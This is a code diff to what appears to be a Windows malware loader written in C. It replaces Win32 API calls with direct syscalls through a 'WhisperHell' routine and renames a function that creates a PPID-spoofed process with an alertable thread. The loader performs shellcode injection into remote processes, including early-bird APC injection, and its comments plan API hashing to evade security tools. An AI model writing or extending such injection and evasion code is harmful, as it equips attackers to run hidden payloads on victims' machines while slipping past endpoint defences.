@@ -43,8 +43,8 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	return TRUE;
 }
 
-// TODO: use syscalls or API hashing
 // TODO: understand the code
+// TODO: use syscalls and API hashing
 BOOL IsProcessElevated(HANDLE hProcess) {
 	HANDLE			hToken = NULL;
 	TOKEN_ELEVATION elevation = { 0 };
@@ -54,12 +54,18 @@ BOOL IsProcessElevated(HANDLE hProcess) {
 		return FALSE;  // Assume not elevated if we can't open the token
 	}
 
+	// TODO: use syscall
 	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
 		CloseHandle(hToken);
 		return FALSE;
 	}
 
-	CloseHandle(hToken);
+	WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
+	if (NtClose(hToken) != 0x0) {
+		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", GetLastError());
+		return FALSE;
+	}
+
 	return elevation.TokenIsElevated;
 }
 
@@ -117,7 +123,11 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDL
 					*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
 					break;
 				}
-				CloseHandle(hProcess); // Close handle if elevated
+				WhisperHell(g_SyscallsTable.NtClose.wSystemCall); // Close handle if elevated
+				if ((status = NtClose(hProcess)) != 0x0) {
+					PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
+					return FALSE;
+				}
 			}
 		}
 
@@ -269,8 +279,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 }
 
 // Function used for APC Injection with PPID Spoofing
-// TODO: use syscalls or API hashings
-BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
+// TODO: use API hashings
+BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
 {
 	CHAR                               lpPath[MAX_PATH * 2];
 	CHAR                               WnDr[MAX_PATH];
@@ -364,7 +374,7 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 	return FALSE;
 }
 
-// TODO: use syscalls or API hashing
+// TODO: use syscalls
 BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, OUT PVOID* ppInjectedShellcodeAddress)
 {
 	PVOID	pShellcodeAddress = NULL;
@@ -402,7 +412,7 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 	return TRUE;
 }
 
-// TODO: use syscalls or API hashing
+// TODO: use syscalls and API hashing
 BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSacrificalProcessName, PVOID pShellcodeAddress, SIZE_T sSizeOfShellcode)
 {
 
@@ -411,7 +421,7 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 	PVOID pInjectedAddress = NULL;
 
 	// Create the sacrificial process
-	if (!CreatePPidSpoofedAndSuspendedProcess(hParentProcess, pstrSacrificalProcessName, &dwProcessId, &hProcess, &hThread)) {
+	if (!CreatePpidSpoofedProcessWithAlertableThread(hParentProcess, pstrSacrificalProcessName, &dwProcessId, &hProcess, &hThread)) {
 		PRINTA("[!] CreatePPidSpoofedAndSuspendedProcess Failed With Error : %d \n", GetLastError());
 		return -1;
 	}
@@ -444,8 +454,9 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 	//Resume the thread in case we use the CREATE_SUSPENDED flag
 	//ResumeThread(hThread);
 
-	if (!WaitForSingleObject(hThread, INFINITE)) {
-		PRINTA("[!] WaitForSingleObject Failed With Error : %d \n", GetLastError());
+	WhisperHell(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
+	if (NtWaitForSingleObject(hThread, FALSE, NULL) != 0x0) {
+		PRINTA("[!] NtWaitForSingleObject Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
